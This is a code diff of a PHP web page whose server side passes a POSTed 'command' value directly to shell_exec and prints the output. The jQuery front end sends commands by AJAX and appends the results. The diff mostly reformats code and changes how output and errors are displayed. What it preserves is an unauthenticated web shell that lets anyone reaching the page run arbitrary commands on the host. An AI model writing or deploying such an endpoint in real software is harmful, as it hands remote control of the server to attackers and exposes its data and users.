@@ -2,8 +2,8 @@
 global $command;
 global $output;
 
-if(isset($_POST["command"])){
-    if ($command != null){
+if (isset($_POST["command"])) {
+    if ($command != null) {
         $output = shell_exec($command);
         echo $output;
     }
@@ -41,25 +41,29 @@ if(isset($_POST["command"])){
     </main>
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-<script>
-    $(document).ready(function () {
-        $('#commandForm').submit(function (e) {
-            e.preventDefault(); // Prevent form submission
-            var command = $('#command').val(); // Get command value
-            $.ajax({
-                type: 'POST',
-                url: '',
-                data: { command: command },
-                success: function (response) {
-                    $('#output').html('<pre>' + response + '</pre>'); // Display output
-                },
-                error: function(xhr, status, error) {
-                    console.error(xhr.responseText);
-                }
+    <script>
+        $(document).ready(function () {
+            $('#commandForm').submit(function (e) {
+                e.preventDefault(); // Prevent form submission
+                var command = $('#command').val(); // Get command value
+                var existingOutput = $('#output').text().trim(); // Get existing output content
+                $.ajax({
+                    type: 'POST',
+                    url: '',
+                    data: { command: command },
+                    success: function (response) {
+                        var outputContent = existingOutput ? existingOutput + '\n' + response : response;
+                        $('#output').text(outputContent); // Update output
+                        console.log(outputContent)
+                    },
+                    error: function (xhr, status, error) {
+                        var errorMessage = "Request: " + xhr.statusText + "\n" + "Response: " + xhr.responseText;
+                        $('#output').text(errorMessage); // Display error message
+                    }
+                });
             });
         });
-    });
-</script>
+    </script>
 
 </body>
 
